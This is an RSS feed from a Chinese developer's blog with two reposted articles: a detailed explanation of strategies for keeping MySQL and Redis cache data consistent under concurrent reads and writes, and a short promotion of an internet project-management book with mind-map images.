<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>艾瑞可erik • Posts by &#34;转载&#34; categories</title>
        <link>https://erik.xyz</link>
        <description>一只PHP开发的程序猿，偶尔做做运维、Goland、Python、Java、摄影、画画、写作、顺便睡觉，反正整站都搞过。</description>
        <language>zh-CN</language>
        <pubDate>Mon, 11 Nov 2024 09:58:00 +0800</pubDate>
        <lastBuildDate>Mon, 11 Nov 2024 09:58:00 +0800</lastBuildDate>
        <category>php扩展</category>
        <category>php技巧</category>
        <category>php类库</category>
        <category>php资源</category>
        <category>日志</category>
        <category>工具</category>
        <category>jquery</category>
        <category>jquery插件</category>
        <category>js</category>
        <category>css</category>
        <category>php</category>
        <category>web</category>
        <category>代码</category>
        <category>压缩</category>
        <category>说说</category>
        <category>趣闻</category>
        <category>php服务器</category>
        <category>随笔</category>
        <category>php实例</category>
        <category>nginx</category>
        <category>转载</category>
        <category>php库</category>
        <category>互联</category>
        <category>项目实战</category>
        <category>javascript</category>
        <category>漏洞</category>
        <category>php应用</category>
        <category>浮点</category>
        <category>http</category>
        <category>http服务器</category>
        <category>负载均衡</category>
        <category>kali</category>
        <category>kali安装</category>
        <category>农业系统</category>
        <category>系统设计</category>
        <category>克莱姆法则</category>
        <category>行列式</category>
        <category>n阶行列式</category>
        <category>支付系统</category>
        <category>支付</category>
        <category>centos</category>
        <category>linux</category>
        <category>apache优化</category>
        <category>apache隐藏index</category>
        <category>nginx优化</category>
        <category>nginx隐藏index</category>
        <category>日常</category>
        <category>seo</category>
        <category>优化</category>
        <category>摘要</category>
        <category>文章</category>
        <category>游记</category>
        <category>ca证书</category>
        <category>证书生成</category>
        <category>二战</category>
        <category>二战熊</category>
        <category>西伯利亚熊</category>
        <category>centos软件</category>
        <category>yum仓库</category>
        <category>软件</category>
        <category>centos安装chromium报错</category>
        <category>chromium安装报错</category>
        <category>svn</category>
        <category>代码提交</category>
        <category>deb</category>
        <category>deb/rpm互转</category>
        <category>deb转rpm</category>
        <category>rpm互转</category>
        <category>centos7安装steam</category>
        <category>centos安装steam</category>
        <category>centos安装吃鸡steam</category>
        <category>linux安装steam</category>
        <category>steam安装</category>
        <category>centos软件安装</category>
        <category>centos6.5</category>
        <category>linux系统</category>
        <category>centos7安装Redis Desktop Manager</category>
        <category>centos7安装redis桌面</category>
        <category>centos安装redis桌面</category>
        <category>linux安装centos7安装Redis Desktop Manager</category>
        <category>Redis Desktop Manager</category>
        <category>redis桌面</category>
        <category>centos7</category>
        <category>centos7-wine</category>
        <category>wine</category>
        <category>wine安装</category>
        <category>root密码</category>
        <category>root密码重置</category>
        <category>忘记root密码</category>
        <category>memcache</category>
        <category>memcached</category>
        <category>生活手记</category>
        <category>艾瑞可erik</category>
        <category>程序员</category>
        <category>开源云</category>
        <category>容器</category>
        <category>cncf</category>
        <category>监控</category>
        <category>composer</category>
        <category>composer部署</category>
        <category>内网部署composer</category>
        <category>cphalcon</category>
        <category>cphalcon报错</category>
        <category>css中的em</category>
        <category>响应式字体</category>
        <category>响应式布局样式</category>
        <category>proxy代理搭建</category>
        <category>代理服务器搭建</category>
        <category>proxy服务器</category>
        <category>查找</category>
        <category>排序</category>
        <category>快速排序</category>
        <category>冒泡排序</category>
        <category>二分查找</category>
        <category>datahub</category>
        <category>datahub安装</category>
        <category>deepin</category>
        <category>emergency</category>
        <category>emergency mode</category>
        <category>deepin黑屏</category>
        <category>清理系统</category>
        <category>清理c盘</category>
        <category>dns</category>
        <category>域名监测</category>
        <category>网站监测</category>
        <category>docker</category>
        <category>php安装</category>
        <category>杂谈</category>
        <category>ecshop</category>
        <category>框架</category>
        <category>beego数据分页</category>
        <category>分页</category>
        <category>elasticsearch</category>
        <category>elasticsearch搭建</category>
        <category>elasticsearch集群</category>
        <category>系统</category>
        <category>emm</category>
        <category>mdm</category>
        <category>phone</category>
        <category>手机</category>
        <category>新闻</category>
        <category>免费</category>
        <category>jenkis</category>
        <category>jenkis教程</category>
        <category>随笔吐槽</category>
        <category>算法</category>
        <category>ping</category>
        <category>ping服务器</category>
        <category>各大网站ping</category>
        <category>搜引擎ping服务器</category>
        <category>go获取ip</category>
        <category>im</category>
        <category>go中pdf生成</category>
        <category>go中限流</category>
        <category>go对接快递签名</category>
        <category>go时间获取</category>
        <category>go类型转换</category>
        <category>微服务</category>
        <category>go-zero</category>
        <category>rpc</category>
        <category>go加密</category>
        <category>go解密</category>
        <category>归</category>
        <category>吐槽</category>
        <category>php大全</category>
        <category>php资料</category>
        <category>hadoop</category>
        <category>hadoop2.8.0</category>
        <category>hadoop安装教程</category>
        <category>hadoop安装详细教程</category>
        <category>hadoop教程</category>
        <category>hadoop部署</category>
        <category>hadoop3</category>
        <category>hadoop配置</category>
        <category>log4j2</category>
        <category>数据库</category>
        <category>hbase安装教程</category>
        <category>hbase</category>
        <category>http1.1</category>
        <category>http2.0</category>
        <category>会话</category>
        <category>会话原理</category>
        <category>hyperf</category>
        <category>杂录</category>
        <category>新冠肺炎</category>
        <category>springboot</category>
        <category>springboot内网部署</category>
        <category>linux恢复</category>
        <category>linux误删</category>
        <category>linux命令</category>
        <category>linux命令汇总</category>
        <category>jenkins</category>
        <category>jetbtrains</category>
        <category>phpstorm</category>
        <category>搜索引擎</category>
        <category>图片</category>
        <category>素材</category>
        <category>jq</category>
        <category>jq侧边导航</category>
        <category>侧边导航</category>
        <category>js判断浏览器</category>
        <category>js判断浏览器版本</category>
        <category>判断浏览器</category>
        <category>浏览器版本判断</category>
        <category>获取浏览器信息</category>
        <category>kali右键汉化</category>
        <category>kali桌面右键汉化</category>
        <category>kali右键创建文件</category>
        <category>区块链</category>
        <category>lanmp</category>
        <category>php环境独立配置</category>
        <category>服务器</category>
        <category>劳动纠纷</category>
        <category>追缴工资</category>
        <category>申请仲裁</category>
        <category>flash</category>
        <category>表单</category>
        <category>linux报错</category>
        <category>linux中update-command-not-found</category>
        <category>linux运行命令报错</category>
        <category>web前端</category>
        <category>web优化</category>
        <category>撮合算法</category>
        <category>撮合</category>
        <category>php撮合算法</category>
        <category>maven搭建库</category>
        <category>maven</category>
        <category>maven内网库</category>
        <category>高级缓存配置</category>
        <category>mongodb</category>
        <category>mongodb权限</category>
        <category>可穿戴设备</category>
        <category>mysql</category>
        <category>分库分表</category>
        <category>mysql应对千万级</category>
        <category>mysql瓶颈</category>
        <category>mysql瓶颈解决办法</category>
        <category>redis</category>
        <category>数据一致性</category>
        <category>mysql消息</category>
        <category>mysql队列</category>
        <category>mysql高并发</category>
        <category>mysql存储</category>
        <category>mysql引擎</category>
        <category>mysql数据表设计选择</category>
        <category>mysql监控</category>
        <category>mysql性能</category>
        <category>内网支付</category>
        <category>内网穿透</category>
        <category>支付接口本地化开发</category>
        <category>本地挂网</category>
        <category>穿透</category>
        <category>go</category>
        <category>new和make的区别</category>
        <category>红包算法</category>
        <category>深圳劳动法服务部门</category>
        <category>非关系型数据库</category>
        <category>onethink</category>
        <category>oop</category>
        <category>php管理系统</category>
        <category>开放接口开发</category>
        <category>开源工具</category>
        <category>桌面共享工具</category>
        <category>openresty</category>
        <category>openvas</category>
        <category>openvas安装</category>
        <category>php变量</category>
        <category>php超级全局变量</category>
        <category>php超级变量</category>
        <category>php基本类型</category>
        <category>php数据类型</category>
        <category>php设计模式</category>
        <category>php对接微信支付</category>
        <category>微信支付</category>
        <category>微信支付回调</category>
        <category>游戏</category>
        <category>php函数</category>
        <category>php随机数</category>
        <category>php获取闰年</category>
        <category>闰年.php时间</category>
        <category>php环境</category>
        <category>php集成环境</category>
        <category>服务器集成环境</category>
        <category>数组函数</category>
        <category>数组排序函数</category>
        <category>php数学函数</category>
        <category>php面试题</category>
        <category>php面向对象</category>
        <category>面向对象</category>
        <category>php-zookeeper</category>
        <category>zookeeper3.5.5</category>
        <category>php-zookeeper扩展</category>
        <category>php串口开发</category>
        <category>php倒计时</category>
        <category>php时间</category>
        <category>倒计时</category>
        <category>计算时间</category>
        <category>PHP数组</category>
        <category>字符串函数</category>
        <category>排序函数</category>
        <category>php的SPL</category>
        <category>SPL手册</category>
        <category>PHP算法</category>
        <category>php递归</category>
        <category>递归</category>
        <category>phpunit</category>
        <category>phpunit安装</category>
        <category>php过滤</category>
        <category>过滤</category>
        <category>foreach</category>
        <category>foreach报错</category>
        <category>php中foreach报错</category>
        <category>php中if</category>
        <category>php中if判断</category>
        <category>php的if</category>
        <category>php字符串</category>
        <category>php7中sphinx</category>
        <category>php7中sphinx扩展</category>
        <category>sphinx扩展</category>
        <category>python</category>
        <category>python库</category>
        <category>a标签</category>
        <category>a标签虚线</category>
        <category>虚线框</category>
        <category>R语言</category>
        <category>数据随机化</category>
        <category>redis总结</category>
        <category>redis命令</category>
        <category>redis监控</category>
        <category>redis锁</category>
        <category>redis分布式锁</category>
        <category>任意金额输入</category>
        <category>10元、5元、2元</category>
        <category>队列</category>
        <category>栈</category>
        <category>顺序表</category>
        <category>链表</category>
        <category>数据结构</category>
        <category>线性结构</category>
        <category>浏览器禁止操作视频</category>
        <category>禁止视频</category>
        <category>响应慢</category>
        <category>页面优化</category>
        <category>js编辑</category>
        <category>runjs</category>
        <category>在线编辑</category>
        <category>rust</category>
        <category>rust配置</category>
        <category>seajs</category>
        <category>session</category>
        <category>路由器烧录</category>
        <category>烧录</category>
        <category>极路由2烧录</category>
        <category>砖头烧录</category>
        <category>免费服务器</category>
        <category>空间</category>
        <category>资源</category>
        <category>深圳政府电话</category>
        <category>深圳电话</category>
        <category>特区电话</category>
        <category>居住证</category>
        <category>居住证签注</category>
        <category>深圳新居住证</category>
        <category>国庆骑行</category>
        <category>深圳珠海骑行</category>
        <category>骑行</category>
        <category>世界那么大</category>
        <category>css3</category>
        <category>css在线生成工具</category>
        <category>css工具</category>
        <category>php正则</category>
        <category>正则</category>
        <category>shodan</category>
        <category>黑谷歌</category>
        <category>黒帽搜素</category>
        <category>shopex</category>
        <category>可视化数据</category>
        <category>数据</category>
        <category>数据表</category>
        <category>json</category>
        <category>json数组</category>
        <category>json解析</category>
        <category>socket通信</category>
        <category>socket多进程</category>
        <category>socket</category>
        <category>sql</category>
        <category>sql优化</category>
        <category>css3兼容360浏览器兼容模式</category>
        <category>css圆角</category>
        <category>结构体转map</category>
        <category>config</category>
        <category>thinkphp</category>
        <category>配置文件</category>
        <category>树</category>
        <category>二叉树</category>
        <category>js插件</category>
        <category>web自适应</category>
        <category>响应式布局</category>
        <category>响应式所有分辨率</category>
        <category>自适应布局</category>
        <category>自适应所有分辨率</category>
        <category>webman</category>
        <category>mysql设置超时，超时</category>
        <category>markdown</category>
        <category>wget</category>
        <category>wget抓取</category>
        <category>网站抓取</category>
        <category>我在</category>
        <category>wordpress</category>
        <category>wordpress标签</category>
        <category>wpscan</category>
        <category>usbrip</category>
        <category>无限极分类</category>
        <category>php无限极</category>
        <category>分类tree</category>
        <category>无限极分类树型</category>
        <category>域名合并</category>
        <category>xhprof</category>
        <category>laravel</category>
        <category>composer插件</category>
        <category>html</category>
        <category>响应式分辨率</category>
        <category>响应式调试</category>
        <category>自适应屏幕</category>
        <category>携程</category>
        <category>携程攻击</category>
        <category>携程网站瘫痪</category>
        <category>物理删除</category>
        <category>3D</category>
        <category>动画</category>
        <category>平台</category>
        <category>虚幻4引擎编辑</category>
        <category>生成唯一id</category>
        <category>生成id</category>
        <category>发邮件</category>
        <category>邮件函数</category>
        <category>储蓄卡免年费</category>
        <category>银行卡</category>
        <category>银行卡免年费</category>
        <category>composer安装</category>
        <category>composer配置</category>
        <category>项目创建composer</category>
        <category>mysql优化</category>
        <category>mysql读写优化</category>
        <category>数据库优化，mysql语句优化</category>
        <category>php加密</category>
        <category>php技术</category>
        <category>夕阳</category>
        <category>mysql函数</category>
        <category>php中mysql函数</category>
        <category>互联网时代</category>
        <category>开源技术</category>
        <category>web框架</category>
        <category>php抓取图片</category>
        <category>php批量抓取页面图片</category>
        <category>邮箱服务器</category>
        <category>正则表达式</category>
        <category>翻墙</category>
        <category>谷歌</category>
        <category>谷歌搜索</category>
        <item>
            <guid isPermalink="true">https://erik.xyz/2024/11/11/mysql-redis-consistency/</guid>
            <title>如何下保证MySQL数据库与Redis缓存数据一致性？</title>
            <link>https://erik.xyz/2024/11/11/mysql-redis-consistency/</link>
            <category>mysql</category>
            <category>redis</category>
            <category>数据一致性</category>
            <pubDate>Mon, 11 Nov 2024 09:58:00 +0800</pubDate>
            <description><![CDATA[ &lt;link rel=&#34;stylesheet&#34; class=&#34;aplayer-secondary-style-marker&#34; href=&#34;/assets/css/APlayer.min.css&#34;&gt;&lt;script src=&#34;/assets/js/APlayer.min.js&#34; class=&#34;aplayer-secondary-script-marker&#34;&gt;&lt;/script&gt;&lt;p&gt;有时候感觉MySQL我们懂了，Redis我们懂了，但是面试的时候一直答不好，经常被难住，问题在哪呢？&lt;/p&gt;
&lt;p&gt;答案是：面试官考的不是专项能力，而是多项技术结合应用能力。&lt;/p&gt;
&lt;p&gt;就拿&lt;strong&gt;并发场景下如何保证MySQL与Redis缓存一致性？&lt;/strong&gt;这个面试官常见的拷打考点举例。&lt;/p&gt;
&lt;p&gt;对于读多写少并且要求高性能的业务逻辑，我们通常在应用服务器访问MySQL数据库的中间加上一层&lt;strong&gt;Redis缓存层&lt;/strong&gt;，以提高数据的查询效率，减轻MySQL数据库的压力，避免在MySQL出现性能瓶颈。&lt;br&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;img src=&#34;/img/2024/2024111101.png&#34; alt=&#34;https://erik.xyz&#34;&gt;&lt;/p&gt;
&lt;p&gt;该问题，如果在数据存储后，只读场景下是不会出现MySQL与Redis缓存的一致性问题的，所以真正需要考虑的是&lt;strong&gt;并发读写场景&lt;/strong&gt;下的数据一致性问题。&lt;/p&gt;
&lt;p&gt;如果我们不加分析，单独利用MySQL和Redis的知识进行回答并发场景下如何保证MySQL与Redis缓存一致性？很难把这个问题回答好，因为看起来很简单的方案实际上是漏洞百出的。&lt;/p&gt;
&lt;h4 id=&#34;简单方案下的漏洞百出&#34;&gt;&lt;a href=&#34;#简单方案下的漏洞百出&#34; class=&#34;headerlink&#34; title=&#34;简单方案下的漏洞百出&#34;&gt;&lt;/a&gt;简单方案下的漏洞百出&lt;/h4&gt;&lt;p&gt;我们先看下简单的更新数据库、删除缓存和更新缓存方案下，会出现什么问题？&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/img/2024/2024111102.png&#34; alt=&#34;https://erik.xyz&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;更新缓存，再更新数据库&#34;&gt;&lt;a href=&#34;#更新缓存，再更新数据库&#34; class=&#34;headerlink&#34; title=&#34;更新缓存，再更新数据库&#34;&gt;&lt;/a&gt;更新缓存，再更新数据库&lt;/h4&gt;&lt;p&gt;先说结论：不考虑。&lt;/p&gt;
&lt;p&gt;原因是更新缓存成功后，数据库可能更新失败，出现数据库为旧值，缓存为新值。导致后续的所有的读请求，在缓存未过期或缓存未重新正确更新的情况下，会一直保持了数据的完全不一致！并且当前数据库中的值为旧值，而业务数据的正确性应该以数据库的为准。&lt;/p&gt;
&lt;p&gt;那么如果更新缓存成功后，数据库可能更新失败，我们&lt;strong&gt;重新更新缓存&lt;/strong&gt;是不是可以了？&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/img/2024/2024111103.png&#34; alt=&#34;https://erik.xyz&#34;&gt;&lt;/p&gt;
&lt;p&gt;抛开需要重新更新缓存时，要单表或多表重新查询数据，再更新数据带来的性能问题，还可能期间有数据变更再次陷入脏数据的情况。实际上仍然还是会出现并发一致性问题。&lt;/p&gt;
&lt;p&gt;只要缓存进行了更新，后续的读请求&lt;strong&gt;在更新数据库前、更新数据库失败并准备更新缓存前&lt;/strong&gt;，基本上都能命中缓存情况，而这时返回的数据都是未落库的脏数据。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/img/2024/2024111104.png&#34; alt=&#34;https://erik.xyz&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;更新数据库，再更新缓存&#34;&gt;&lt;a href=&#34;#更新数据库，再更新缓存&#34; class=&#34;headerlink&#34; title=&#34;更新数据库，再更新缓存&#34;&gt;&lt;/a&gt;更新数据库，再更新缓存&lt;/h4&gt;&lt;p&gt;不考虑。&lt;/p&gt;
&lt;p&gt;原因是当数据库更新成功后，缓存更新失败，出现数据库为最新值，缓存为旧值。导致后续的所有的读请求，在缓存未过期或缓存未重新正确更新的情况下，会一直保持了数据的完全不一致！&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/img/2024/2024111105.png&#34; alt=&#34;https://erik.xyz&#34;&gt;&lt;/p&gt;
&lt;p&gt;该方案就算在更新数据库、更新缓存都成功的情况下，还是会存在并发引发的一致性问题，如下图所示（点击图片查看大图）：&lt;br&gt;&lt;img src=&#34;/img/2024/2024111106.png&#34; alt=&#34;https://erik.xyz&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以看到在并发多写多读的场景下数据存在的不一致性问题。&lt;/p&gt;
&lt;h4 id=&#34;先删除缓存，再更新数据库&#34;&gt;&lt;a href=&#34;#先删除缓存，再更新数据库&#34; class=&#34;headerlink&#34; title=&#34;先删除缓存，再更新数据库&#34;&gt;&lt;/a&gt;先删除缓存，再更新数据库&lt;/h4&gt;&lt;p&gt;不考虑，但是通过使用&lt;strong&gt;延时双删策略&lt;/strong&gt;后可以考虑。&lt;/p&gt;
&lt;p&gt;采用“&lt;strong&gt;先删除缓存，再更新数据库&lt;/strong&gt;”的方案是一种常见的方法来尝试解决这个问题的策略。&lt;/p&gt;
&lt;p&gt;这种方法逻辑较为简单，易于理解和实现，理论上删除旧缓存后，下次读取时将从数据库获取最新数据。&lt;/p&gt;
&lt;p&gt;但在并发的极端情况下，删除缓存成功后，如果再有大量的并发请求进来，那么便会直接请求到数据库中，对数据库造成巨大的压力。而且此方案还是可能会发生数据不一致性问题。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/img/2024/2024111107.png&#34; alt=&#34;https://erik.xyz&#34;&gt;&lt;/p&gt;
&lt;p&gt;通过上图发现在删除缓存后，如果有并发读请求1.1进来，那么查询缓存肯定是不存在，则去读取数据库，但因为此时更新数据库x=10的操作2.更新数据库还未完成，所以读取到的仍然是旧值x=5并设置缓存后，在2.更新数据库完成后，数据是新值10，而缓存是旧值，造成了数据不一致的问题。&lt;/p&gt;
&lt;p&gt;对此我们可以先进行一波的小优化，那就是&lt;strong&gt;延时双删策略&lt;/strong&gt;。即在更新数据库之后，先延迟等待一下（等待时间参考该读请求的响应时间+几十毫秒），再继续删除缓存。这样做的目的是确保读请求结束（已经在1.2读库中读取到了旧数据，后续会在该请求中更新缓存），写请求可以删除读请求造成的缓存脏数据，保证再删除缓存之后的所有读请求都能读到最新值。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/img/2024/2024111108.png&#34; alt=&#34;https://erik.xyz&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以看出此优化方案关键点在于等待多长时间后，再次删除缓存尤为重要，但是这个时间都是根据历史查询请求的响应时间判断的，实际情况会有浮动。这也导致如果等待的延时时间过短，则仍然会出现数据不一致的情况；等待延迟时间过长，则导致延迟期间出现数据不一致的时间变长。&lt;/p&gt;
&lt;p&gt;另外&lt;strong&gt;延时双删策略&lt;/strong&gt;还需要考虑如果再次删除缓存失败的情况如何处理？&lt;/p&gt;
&lt;p&gt;因为删除失败将导致后续的所有的读请求，在缓存未过期或缓存未重新正确更新的情况下，会一直保持了数据的完全不一致！这个在下文的技术优化方案继续讨论。&lt;/p&gt;
&lt;h4 id=&#34;先更新数据库，再删除缓存&#34;&gt;&lt;a href=&#34;#先更新数据库，再删除缓存&#34; class=&#34;headerlink&#34; title=&#34;先更新数据库，再删除缓存&#34;&gt;&lt;/a&gt;先更新数据库，再删除缓存&lt;/h4&gt;&lt;p&gt;比较推荐。&lt;/p&gt;
&lt;p&gt;采用的“先更新数据库，再删除缓存”策略，跟“先删除缓存，再更新数据库”中我们进行&lt;strong&gt;延时双删策略&lt;/strong&gt;的小优化基本一样，仍然需要考虑删除缓存失败的情况如何处理。&lt;/p&gt;
&lt;p&gt;单纯从“先更新数据库，再删除缓存”和“先删除缓存，再更新数据库”对比起来。在大多数情况下，“先更新数据库，再删除缓存”被认为是一个更好的选择，原因如下：&lt;/p&gt;
&lt;p&gt;1.&lt;strong&gt;数据的一致性&lt;/strong&gt;：这种方法更倾向于保持数据的最终一致性，即使缓存删除失败，也能保证数据的一致性不会长期受损。&lt;/p&gt;
&lt;p&gt;2.&lt;strong&gt;用户体验&lt;/strong&gt;：在“先删除缓存，再更新数据库”的情况下，如果数据库更新失败，用户可能会一直看到旧数据，直到缓存过期。相比之下，“先更新数据库，再删除缓存”可以在某种程度上避免这种情况。&lt;/p&gt;
&lt;p&gt;但该方案同样也会出现数据不一致性问题，如下图所示。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/img/2024/2024111109.png&#34; alt=&#34;https://erik.xyz&#34;&gt;&lt;/p&gt;
&lt;p&gt;当数据库的数据被更新后，缓存也被删除。接下来的出现读请求3.1和写请求3.2同时进来。&lt;/p&gt;
&lt;p&gt;读请求先读了缓存发现缓存无命中，则查询数据库并在准备更新缓存时，3.2写请求已经完成了数据的更新和删除缓存的动作，之后3.1读请求才更新了缓存。最后导致了数据库中的值未新值，缓存中的值为旧值。&lt;/p&gt;
&lt;h4 id=&#34;优化后方案&#34;&gt;&lt;a href=&#34;#优化后方案&#34; class=&#34;headerlink&#34; title=&#34;优化后方案&#34;&gt;&lt;/a&gt;优化后方案&lt;/h4&gt;&lt;p&gt;从上面的简单方案方案中，似乎没有一种方案真正能解决并发场景下MySQL数据与Redis缓存数据一致性的问题。&lt;/p&gt;
&lt;p&gt;这里有个说明下，如果业务要求必须要满足&lt;strong&gt;强一致性&lt;/strong&gt;，那么不管如何优化缓存策略，都无法满足，而最好的办法是不用缓存。&lt;/p&gt;
&lt;p&gt;强一致性：它要求系统写入什么，读出来的也会是什么，用户体验好，但实现起来往往对系统的性能影响大。&lt;/p&gt;
&lt;p&gt;解决方案是读写串行化，而此方案会大大增加系统的处理效率，吞吐量也会大大降低。&lt;/p&gt;
&lt;p&gt;另外在大型分布式系统中，其实分布式事务大多数情况都不会使用，因为维护成本太高了、复杂度也高。所以在分布式系统，我们一般都会推崇最终一致性，即这种一致性级别约束了系统在写入成功后，不承诺立即可以读到写入的值，也不承诺多久之后数据能够达到一致，但会尽可能地保证到某个时间级别（比如秒级别）后，数据能够达到一致状态。&lt;/p&gt;
&lt;p&gt;现在我们接着继续优化..&lt;/p&gt;
&lt;h4 id=&#34;延迟双删策略-重试机制&#34;&gt;&lt;a href=&#34;#延迟双删策略-重试机制&#34; class=&#34;headerlink&#34; title=&#34;延迟双删策略+重试机制&#34;&gt;&lt;/a&gt;延迟双删策略+重试机制&lt;/h4&gt;&lt;p&gt;从上面简单方案下的漏洞百出下的先删除缓存，再更新数据库中，我们可以看出来其实&lt;strong&gt;延迟双删策略&lt;/strong&gt;，算是融合“先删除缓存，再更新数据库”和“先更新数据库，再删除缓存”的策略，可以解决大部分的数据一致性的业务逻辑处理问题。&lt;/p&gt;
&lt;p&gt;但我们前面还遗留了一个待解决的问题：如果再次&lt;strong&gt;删除缓存失败的情况如何处理&lt;/strong&gt;？&lt;/p&gt;
&lt;p&gt;——-当然是补救去继续删除这个缓存Key了，而补救方法则是&lt;strong&gt;重试&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;重试机制&lt;/strong&gt;可以在当前中启动新协程（Golang中属于用户态的轻量级线程）中进行重试；也可以放到消息队列中进行重试；还可以是先启动新协程重试3次，重试失败后继续放到消息队列中重试，如下图展示的是放到消息队列中进行重试。&lt;/p&gt;
&lt;p&gt;新协程中进行重试需要注意的是使用的新上下文context.Background()，而不是当前请求的上下文。&lt;/p&gt;
&lt;p&gt;一般消息队列会支持高可靠性的队列，例如 RabbitMQ、Kafka 等。这些消息队列提供了非常强的消息传递、异步处理和持久化功能，可以有效地解决数据同步的问题。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/img/2024/2024111110.png&#34; alt=&#34;https://erik.xyz&#34;&gt;&lt;/p&gt;
&lt;p&gt;此方案仍然存在一些需要，如：选择合适的延迟等待时间进行删除缓存；协程中重试删除缓存次数、间隔时间；消息队列中删除失败缓存失败后是否需要重试等。&lt;/p&gt;
&lt;h4 id=&#34;读取binlog异步删除缓存&#34;&gt;&lt;a href=&#34;#读取binlog异步删除缓存&#34; class=&#34;headerlink&#34; title=&#34;读取binlog异步删除缓存&#34;&gt;&lt;/a&gt;读取binlog异步删除缓存&lt;/h4&gt;&lt;p&gt;重试删除缓存机制还可以吧，就是会造成好多业务代码入侵。&lt;/p&gt;
&lt;p&gt;其实，还可以这样优化：&lt;/p&gt;
&lt;p&gt;1.通过Canal将binlog日志采集发送到MQ队列来异步淘汰key。&lt;/p&gt;
&lt;p&gt;2.删除缓存的应用程序通过ACK手动机制确认处理这条更新消息，删除缓存，保证数据缓存一致性。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/img/2024/2024111111.png&#34; alt=&#34;https://erik.xyz&#34;&gt;&lt;/p&gt;
&lt;p&gt;异步淘汰key相比于等新对比缓存数据并更新会简单一些，因为可能一份缓存数据涉及多张表的数据查询、聚合、排序等。&lt;/p&gt;
&lt;p&gt;尽管该方案看起来也不错了，但是因为引入额外的组件（如Canal、消息队列）复杂性增加了也不少，需要维护和监控这些组件的运行状态，保证组件运行正常。&lt;/p&gt;
&lt;h4 id=&#34;定时任务&#34;&gt;&lt;a href=&#34;#定时任务&#34; class=&#34;headerlink&#34; title=&#34;定时任务&#34;&gt;&lt;/a&gt;定时任务&lt;/h4&gt;&lt;p&gt;在某些业务场景的需求下，也可以通过定时任务的方式进行 Redis 和 MySQL 的数据同步。&lt;/p&gt;
&lt;p&gt;具体做法是通过定时任务从 Redis 中读取数据，然后跟 MySQL 中的数据进行比对，如果 Redis 中数据有变化，则进行同步。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/img/2024/2024111112.png&#34; alt=&#34;https://erik.xyz&#34;&gt;&lt;/p&gt;
&lt;p&gt;这种方式虽然实现起来比较简单，但需要注意同步的时效性，如果时间间隔设置不当，可能会导致同步的数据丢失或者不准确。&lt;/p&gt;
&lt;h4 id=&#34;双写一致性&#34;&gt;&lt;a href=&#34;#双写一致性&#34; class=&#34;headerlink&#34; title=&#34;双写一致性&#34;&gt;&lt;/a&gt;双写一致性&lt;/h4&gt;&lt;p&gt;在更新数据库的同时也更新缓存/删除缓存，即所谓的“&lt;strong&gt;双写&lt;/strong&gt;”。&lt;/p&gt;
&lt;p&gt;这样可以确保在数据库更新后，缓存中的数据也是最新的，从而减少数据不一致的时间窗口。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/img/2024/2024111113.png&#34; alt=&#34;https://erik.xyz&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;并发控制&lt;/strong&gt;：在高并发场景下，多个请求同时对同一个数据进行更新时，如果没有妥善处理并发控制，可能会导致数据不一致的问题。所以这里引入了分布式锁和事务操作：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;使用分布式锁&lt;/strong&gt;：在执行双写操作之前，获取一个分布式锁（如Zookeeper、Redis的SETNX命令等），确保同一时刻只有一个线程/进程能够执行双写操作。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;事务处理&lt;/strong&gt;：对于支持事务的缓存系统（如Redis的MULTI/EXEC命令）和MySQL事务，可以将Redis缓存和MySQL更新操作放入事务中，确保要么全部成功，要么全部失败。&lt;/p&gt;
&lt;p&gt;当然在“双写”的策略中，除了并发控制外，可以结合上面提到的重试、定时策略进行组合，以应对极端情况下的数据不一致性问题。&lt;/p&gt;
&lt;p&gt;另外也可以处理失败的逻辑上加入告警机制，及时通知开发和运维人员。&lt;/p&gt;
&lt;p&gt;转载自：&lt;a href=&#34;https://mp.weixin.qq.com/s/sG7xDtLKLtlnu9ntpc5hdw&#34;&gt;皇子谈技术&lt;/a&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://erik.xyz/2024/09/22/internet-practice/</guid>
            <title>史上最详细的互联网项目管理实战图解</title>
            <link>https://erik.xyz/2024/09/22/internet-practice/</link>
            <category>互联</category>
            <category>项目实战</category>
            <pubDate>Sun, 22 Sep 2024 08:46:00 +0800</pubDate>
            <description><![CDATA[ &lt;link rel=&#34;stylesheet&#34; class=&#34;aplayer-secondary-style-marker&#34; href=&#34;/assets/css/APlayer.min.css&#34;&gt;&lt;script src=&#34;/assets/js/APlayer.min.js&#34; class=&#34;aplayer-secondary-script-marker&#34;&gt;&lt;/script&gt;&lt;p&gt;&lt;img src=&#34;/img/2024/640.jpeg&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
&lt;p&gt;如何系统的掌握互联网项目管理知识和经验，我搜罗世面上基本没有介绍这方面的图书，为此咱们去年年初，组织咱们前沿社区的众多大咖联合电子工业出版社出版了这本新书《互联网项目管理实战指南》希望可以助大家一臂之力！今天把文章的思维导图干货一起分享给大家！&lt;br&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;img src=&#34;/img/2024/640.png&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/img/2024/641.png&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/img/2024/642.png&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
